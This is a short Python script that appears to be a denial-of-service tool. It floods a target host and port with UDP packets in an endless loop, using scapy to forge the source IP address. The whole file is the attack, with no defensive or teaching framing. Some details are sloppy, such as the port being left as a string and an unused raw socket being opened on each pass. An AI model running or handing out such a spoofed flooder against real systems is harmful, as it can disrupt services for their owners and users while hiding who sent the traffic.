import socket
from scapy.all import IP, UDP, send
import sys


def main(target,port):

    # While loop to continuously send UDP packets
    while True:
        try:
            # Create a raw socket and set the IP header fields
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            # Craft the IP header with a fake source IP
            fake_ip = "182.21.20.32"
            ip_packet = IP(src=fake_ip, dst=target)

            # Craft the UDP packet (no flags for UDP)
            udp_packet = UDP(sport=12345, dport=port)

            # Send the UDP packet
            send(ip_packet/udp_packet)

        except KeyboardInterrupt:
            break

        except socket.error:
            print("Socket error occurred. Check privileges or run with admin/root access.")
            break

if __name__ == "__main__":
    main(sys.argv[1],sys.argv[2])
